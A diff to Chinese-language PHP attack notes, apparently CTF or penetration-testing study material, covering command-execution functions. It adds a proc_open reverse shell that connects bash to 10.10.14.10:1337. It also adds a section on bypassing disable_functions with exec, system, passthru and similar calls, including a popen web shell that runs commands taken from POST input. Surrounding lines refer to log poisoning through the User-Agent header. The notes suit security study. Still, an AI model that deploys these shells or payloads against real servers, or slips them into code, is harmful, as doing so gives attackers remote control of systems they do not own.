@@ -50,7 +50,9 @@ mode为'r'或'w' 无回显，读出后输出
 
 ### 6.proc_open 
 
-```
+#### 命令执行
+
+```php
  <?php
  header\("content-type:text/html;charset=utf-8"); 
  highlight_file(__FILE__);
@@ -62,6 +64,20 @@ mode为'r'或'w' 无回显，读出后输出
  echo stream_get_contents($pipes[1]);  //为什么是$pipes[1]，因为1是输出内容 
  proc_close($fp);
  ?> 
+```
+
+#### 反弹shell
+
+```php
+<?php
+$descriptorspec = array(
+0 => array('pipe', 'r'), // stdin
+1 => array('pipe', 'w'), // stdout
+2 => array('pipe', 'a') // stderr
+);
+$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
+$process = proc_open($cmd, $descriptorspec, $pipes, null, null);
+?>
 ```
 
 
@@ -965,3 +981,70 @@ nginx服务器的日志通常为/var/log/nginx/access.log
 查看日志文件记录的是什么
 
 例记录User-Agent,则可以在User-Agent中写入php语句实现命令执行
+
+# 16.disable_function绕过
+
+## 常规绕过（黑名单绕过）
+
+即便是通过disable functions限制危险函数，也可能会有限制不全的情况。如果运维人员安全意识不强或对PHP不甚了解的话，则很有可能忽略某些危险函数，常见的有以下几种。
+
+exec()
+
+```
+<?php
+echo exec('whoami');
+?>
+```
+
+shell_exec()
+
+```
+<?php
+echo shell_exec('whoami');
+?>
+```
+
+system()
+
+```
+<?php
+system('whoami');
+?>
+```
+
+passthru()
+
+```
+<?php
+passthru("whoami");
+?>
+```
+
+popen()
+
+```
+<?php
+$command=$_POST['cmd'];
+$handle = popen($command,"r");
+while(!feof($handle)){        
+    echo fread($handle, 1024);  //fread($handle, 1024);
+}  
+pclose($handle);
+?>
+```
+
+proc_open()
+
+```
+<?php
+$command="ipconfig";
+$descriptorspec = array(1 => array("pipe", "w"));
+$handle = proc_open($command ,$descriptorspec , $pipes);
+while(!feof($pipes[1])){     
+    echo fread($pipes[1], 1024); //fgets($pipes[1],1024);
+}
+?>
+```
+
+还有一个比较常见的易被忽略的函数就是pcntl_exec。
+
